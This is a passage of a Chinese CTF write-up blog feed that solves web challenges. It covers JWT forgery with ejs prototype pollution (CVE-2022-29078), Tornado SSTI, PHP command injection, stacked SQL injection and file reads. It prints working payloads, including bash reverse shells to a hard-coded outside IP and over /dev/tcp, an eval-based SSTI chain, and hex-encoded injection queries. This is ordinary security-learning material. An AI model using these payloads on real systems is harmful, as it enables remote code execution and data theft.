class="attr">msg</span>: <span class="string">&quot;Username existed.&quot;</span>&#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">const</span> secret = crypto.<span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">      <span class="keyword">const</span> secretid = <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="property">length</span>;</span><br><span class="line">      <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="title function_">push</span>(secret);</span><br><span class="line">      <span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&quot;HS256&quot;</span>&#125;);</span><br><span class="line">      res.<span class="title function_">render</span>(<span class="string">&#x27;register.ejs&#x27;</span>, &#123;<span class="attr">msg</span>: <span class="string">&quot;Token: &quot;</span> + token&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">all</span>(<span class="string">&#x27;/home&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">data</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;home.ejs&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>||<span class="string">&#x27;NSS&#x27;</span>,</span><br><span class="line">      <span class="attr">count</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">count</span>||<span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">      <span class="attr">msg</span>: <span class="literal">null</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">post</span>(<span class="string">&#x27;/update&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">data</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span> !== <span class="string">&#x27;nss&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;home.ejs&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>||<span class="string">&#x27;NSS&#x27;</span>,</span><br><span class="line">        <span class="attr">count</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">count</span>||<span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="attr">msg</span>: <span class="string">&#x27;U cant change uid&#x27;</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> data = req.<span class="property">session</span>.<span class="property">data</span> || &#123;&#125;;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">data</span> = lodash.<span class="title function_">merge</span>(data, req.<span class="property">body</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">outputFunctionName</span>);</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/home&#x27;</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">listen</span>(<span class="number">827</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>先是ejs空密钥缺陷  先注册获取一个时间戳</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693295357231-d4fb9748-a150-45a3-9899-f1196b7d9dd1.png" alt="img"></p><p>sid为token中的secretid，直接取数组让其报错为undefined</p><p>看大佬师傅的博客是因为jwt空算法攻击导致可伪造</p><p>官方：</p><ol><li>verify时正确的参数是algorithms而不是algorithm，所以这里本质传了个空加密，导致允许空密钥，我们无须获得JWT密钥（高版本已修改）。</li><li>第二个是关于sid的弱比较，如果只是允许空密钥的话我们不知道secret依然无法verify，这里sid如果传个数组就能轻松绕过判断并且<br><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693370732570-c47d2a3a-0bca-483f-9443-c9ff1a6eb437.png" alt="img"></li></ol><p>然后本地构造一个nss账号的token</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693293966734-19bd978f-198a-40c5-b080-5763ae755c45.png" alt="img"></p><p>然后登录 可以看到&#x2F;update路由下存在原型链污染 之后就是去找链子 没找到。。。。低能</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">post</span>(<span class="string">&#x27;/update&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">data</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span> !== <span class="string">&#x27;nss&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;home.ejs&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>||<span class="string">&#x27;NSS&#x27;</span>,</span><br><span class="line">        <span class="attr">count</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">count</span>||<span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="attr">msg</span>: <span class="string">&#x27;U cant change uid&#x27;</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> data = req.<span class="property">session</span>.<span class="property">data</span> || &#123;&#125;;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">data</span> = lodash.<span class="title function_">merge</span>(data, req.<span class="property">body</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">outputFunctionName</span>);</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/home&#x27;</span>);</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><p>是高版本ejs3.1.7的链子 终于找到出处了<a href="https://inhann.top/2023/03/26/ejs/">https://inhann.top/2023/03/26/ejs/</a> 还是个cve 妈的CVE-2022-29078</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line">  <span class="string">&quot;settings&quot;</span>:&#123;</span><br><span class="line">    <span class="string">&quot;view options&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;escapeFunction&quot;</span>:<span class="string">&quot;console.log;this.global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/8.130.34.53/7777 &lt;&amp;1\&quot;&#x27;);&quot;</span>,</span><br><span class="line">      <span class="string">&quot;client&quot;</span>:<span class="string">&quot;true&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693300087149-8b21e202-2dc4-45b3-87c9-373819daf28d.png" alt="img"></p><h1 id="MyHurricane"><a href="#MyHurricane" class="headerlink" title="MyHurricane"></a>MyHurricane</h1><p>源码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.<span class="property">ioloop</span></span><br><span class="line"><span class="keyword">import</span> tornado.<span class="property">web</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="variable constant_">BASE_DIR</span> = os.<span class="property">path</span>.<span class="title function_">dirname</span>(__file__)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">waf</span>(data):</span><br><span class="line">    bl = [<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="attr">bl</span>:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> <span class="attr">data</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">False</span></span><br><span class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> data.<span class="title function_">split</span>():</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="attr">chunk</span>:</span><br><span class="line">            <span class="keyword">if</span> not (<span class="number">31</span> &lt; <span class="title function_">ord</span>(c) &lt; <span class="number">128</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="title class_">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IndexHandler</span>(tornado.<span class="property">web</span>.<span class="property">RequestHandler</span>):</span><br><span class="line">    def <span class="title function_">get</span>(self):</span><br><span class="line">        <span class="keyword">with</span> <span class="title function_">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> <span class="attr">f</span>:</span><br><span class="line">            self.<span class="title function_">finish</span>(f.<span class="title function_">read</span>())</span><br><span class="line">    def <span class="title function_">post</span>(self):</span><br><span class="line">        data = self.<span class="title function_">get_argument</span>(<span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_">waf</span>(data):</span><br><span class="line">            <span class="keyword">with</span> <span class="title function_">open</span>(<span class="string">&#x27;1.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> <span class="attr">f</span>:</span><br><span class="line">                f.<span class="title function_">write</span>(f<span class="string">&quot;&quot;</span><span class="string">&quot;&lt;html&gt;</span></span><br><span class="line"><span class="string">                        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">                        &lt;body style=&quot;</span>font-<span class="attr">size</span>: 30px;<span class="string">&quot;&gt;&#123;data&#125;&lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">                        &quot;</span><span class="string">&quot;&quot;</span>)</span><br><span class="line">                f.<span class="title function_">flush</span>()</span><br><span class="line">            self.<span class="title function_">render</span>(<span class="string">&#x27;1.html&#x27;</span>)</span><br><span class="line">        <span class="attr">else</span>:</span><br><span class="line">            self.<span class="title function_">finish</span>(<span class="string">&#x27;no no no&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = tornado.<span class="property">web</span>.<span class="title class_">Application</span>([</span><br><span class="line">            (r<span class="string">&quot;/&quot;</span>, <span class="title class_">IndexHandler</span>),</span><br><span class="line">        ], compiled_template_cache=<span class="title class_">False</span>)</span><br><span class="line">    app.<span class="title function_">listen</span>(<span class="number">827</span>)</span><br><span class="line">    tornado.<span class="property">ioloop</span>.<span class="property">IOLoop</span>.<span class="title function_">current</span>().<span class="title function_">start</span>()</span><br></pre></td></tr></table></figure><p>一眼丁真是tornado的ssti了  payload大致上和我们学习flask ssti一样 都有稍有不同</p><p>waf了 <code>[&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;__&#39;, &#39;(&#39;, &#39;)&#39;, &#39;or&#39;, &#39;and&#39;, &#39;not&#39;, &#39;&#123;&#123;', '&#125;&#125;&#39;]</code></p><p>我死在了括号上 当时在想连括号都waf了 怎么了构造payload啊</p><p>之后发现大佬们根本不用括号。。。。</p><p>还有就是又有非预期</p><h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p>直接用文件包含</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extend /proc/self/environ %&#125;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include /proc/self/environ %&#125;</span><br></pre></td></tr></table></figure><p>当然记得url编码打入</p><h2 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h2><p>还有另一种是god 的payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssti=&#123;%<span class="number">25</span> set _tt_utf8 =<span class="built_in">eval</span> %<span class="number">25</span>&#125;&#123;%<span class="number">25</span> raw request.<span class="property">body_arguments</span>[request.<span class="property">method</span>][<span class="number">0</span>] %<span class="number">25</span>&#125;&amp;<span class="variable constant_">POST</span>=<span class="title function_">__import__</span>(<span class="string">&#x27;os&#x27;</span>).<span class="title function_">popen</span>(<span class="string">&quot;bash -c &#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2Fport%20%3C%261&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><p>这种方法利用了tornado里的变量覆盖，让__tt_utf8为eval，在渲染时时会有__tt_utf8(__tt_tmp)这样的调用，然后让__tt_tmp为恶意字符串就好了，我fuzz了一下，上述payload中raw语句可以给tmp赋值，所以rce</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% raw *expr* %&#125;</span><br></pre></td></tr></table></figure><p>就是常规的模板语句，只是输出不会被转义</p><p><code>request.body_arguments</code>：request.body_arguments 是 Tornado 框架中的一个属性，用于获取当前 HTTP 请求中的表单数据或URL编码数据。</p><p>在 HTTP 请求中，请求体（body）通常用于传输 POST 请求中的表单数据或 URL 编码数据。request.body_arguments 可以解析并返回这些数据的字典形式。</p><p><code>request.method</code>是 Tornado 框架中的一个属性，用于获取当前 HTTP 请求的请求方法</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693307041761-05276fd0-0b48-4d6a-ac04-e3d5e644a066.png" alt="img"></p><p>来自:<a href="https://www.tr0y.wang/2022/08/05/SecMap-SSTI-tornado/#%E5%88%A9%E7%94%A8-httpserverrequest">https://www.tr0y.wang/2022/08/05/SecMap-SSTI-tornado/#%E5%88%A9%E7%94%A8-httpserverrequest</a></p><p>真的太强了qwq 又学到新姿势了</p>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0xgame2023 web复现学习</title>
      <link href="/post/7a0dbac6.html"/>
      <url>/post/7a0dbac6.html</url>
      
        <content type="html"><![CDATA[<p>0xgame的师傅出的题都很好！！</p><span id="more"></span><h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><h2 id="Week-1-signin"><a href="#Week-1-signin" class="headerlink" title="[Week 1] signin"></a>[Week 1] signin</h2><p>找j源码就有</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696128791084-a0ea71f9-f12e-45cf-a069-46d8e6a40e9f.png" alt="img"></p><h2 id="Week-1-hello-http"><a href="#Week-1-hello-http" class="headerlink" title="[Week 1] hello_http"></a>[Week 1] hello_http</h2><p>经典考察http协议</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /?query=ctf HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">124.71</span><span class="number">.184</span><span class="number">.68</span>:<span class="number">50012</span></span><br><span class="line">Content-Length: <span class="number">14</span></span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: http:<span class="comment">//124.71.184.68:50012</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: HarmonyOS Browser</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Referer: ys.mihoyo.com</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="comment">Cookie: role=admin</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">action=getflag</span></span><br></pre></td></tr></table></figure><h2 id="Week-1-baby-php"><a href="#Week-1-baby-php" class="headerlink" title="[Week 1] baby_php"></a>[Week 1] baby_php</h2><p>经典题型 注意一下这里就是要用伪协议去读 别直接包含flag那样读不出来的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /?a=QNKCDZO&amp;b=<span class="number">240610708</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">120.27</span><span class="number">.148</span><span class="number">.152</span>:<span class="number">50014</span></span><br><span class="line">Content-Length: <span class="number">11</span></span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: http:<span class="comment">//120.27.148.152:50014</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">117.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Referer: http://120.27.148.152:50014/?a=QNKCDZO&amp;b=240610708</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: name=php://filter/read=convert.base64-encode/resource=flag</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">c=1024.1%00</span></span><br></pre></td></tr></table></figure><h2 id="Week-1-ping"><a href="#Week-1-ping" class="headerlink" title="[Week 1] ping"></a>[Week 1] ping</h2><p>疑似被搅屎了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function <span class="title function_">sanitize</span><span class="params">($s)</span> &#123;</span><br><span class="line">    $s = str_replace(<span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $s);</span><br><span class="line">    $s = str_replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>, $s);</span><br><span class="line">    $s = str_replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $s);</span><br><span class="line">    $s = str_replace(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $s);</span><br><span class="line">    <span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!isset($_POST[<span class="string">&#x27;ip&#x27;</span>])) &#123;</span><br><span class="line">    die(<span class="string">&#x27;No IP Address&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ip = $_POST[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$ip = sanitize($ip);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#x27;</span>, $ip)) &#123;</span><br><span class="line">    die(<span class="string">&#x27;Invalid IP Address&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&#x27;ping -c 4 &#x27;</span>.$ip. <span class="string">&#x27; 2&gt;&amp;1&#x27;</span>);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696132566678-8a6865cd-dbef-41e2-ad6e-73f8a03baef2.png" alt="img"></p><p>没搅屎的payload:</p><p>用base64编码绕过就行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|echo$&#123;IFS&#125;<span class="string">&quot;Y2F0IC9mKg==&quot;</span>|base64$&#123;IFS&#125;-d|bash</span><br></pre></td></tr></table></figure><h2 id="Week-1-repo-leak"><a href="#Week-1-repo-leak" class="headerlink" title="[Week 1] repo_leak"></a>[Week 1] repo_leak</h2><p>要用这个工具才能找到git泄露<a href="https://github.com/gakki429/Git_Extract">https://github.com/gakki429/Git_Extract</a></p><p>githack拉取不到</p><p>然后翻源码能找到</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696134140917-f87d509a-66bf-4a36-aa10-a94c2ff9944a.png" alt="img"></p><h1 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h1><p>操你妈不知道是我这里校园网的原因 环境一直像狗屎一样恶心我</p><p>文件上传一直访问不到文件 sql注入一直转圈链接失败</p><h2 id="Week-2-ez-upload"><a href="#Week-2-ez-upload" class="headerlink" title="[Week 2] ez_upload"></a>[Week 2] ez_upload</h2><p>考点:</p><ul><li>二次渲染</li></ul><p><a href="https://github.com/hxer/imagecreatefrom-/tree/master">https://github.com/hxer/imagecreatefrom-/tree/master</a> 项目地址</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1706504011828-b2ead022-8518-4f97-85e7-88d2da05808c.png" alt="img"></p><h2 id="Week-2-ez-sqli"><a href="#Week-2-ez-sqli" class="headerlink" title="[Week 2] ez_sqli"></a>[Week 2] ez_sqli</h2><p>考点:</p><ul><li>堆叠注入</li><li>预处理</li><li>报错注入</li></ul><p>payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?order=id;set<span class="comment">/**/<span class="doctag">@c</span>=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C646174616261736528292929;prepare/**/</span>aaa<span class="comment">/**/from <span class="doctag">@c</span>;execute/**/</span>aaa;</span><br><span class="line">?order=id;set<span class="comment">/**/<span class="doctag">@c</span>=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C2853454C4543542047726F75705F636F6E636174287461626C655F6E616D65292046524F4D20696E666F726D6174696F6E5F736368656D612E7461626C6573205748455245207461626C655F736368656D61203D2027637466272929293B;prepare/**/</span>aaa<span class="comment">/**/from <span class="doctag">@c</span>;execute/**/</span>aaa;</span><br><span class="line">?order=id;set<span class="comment">/**/<span class="doctag">@c</span>=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C2873656C6563742067726F75705F636F6E63617428636F6C756D6E5F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F736368656D613D276374662720616E64207461626C655F6E616D653D27666C6167272929293B;prepare/**/</span>aaa<span class="comment">/**/from <span class="doctag">@c</span>;execute/**/</span>aaa;</span><br><span class="line">?order=id;set<span class="comment">/**/<span class="doctag">@c</span>=0x73656c656374206578747261637476616c756528312c636f6e63617428307837652c307837652c737562737472282873656c65637420666c61672066726f6d206374662e666c6167292c312c33302929293b;prepare/**/</span>aaa<span class="comment">/**/from <span class="doctag">@c</span>;execute/**/</span>aaa;</span><br></pre></td></tr></table></figure><p>需要注意的几个点是:</p><ul><li><code>0x字符串</code>是预处理语句的字符转16进制</li><li>最后报错注入获得flag的时候要利用substr函数截取flag 不然显示不全</li><li>语句间虽然没有ban空格但是空格会被tun 还是给替换了。。 反正<code>/**/</code>绕一下</li></ul><h2 id="Week-2-ez-unserialize"><a href="#Week-2-ez-unserialize" class="headerlink" title="[Week 2] ez_unserialize"></a>[Week 2] ez_unserialize</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 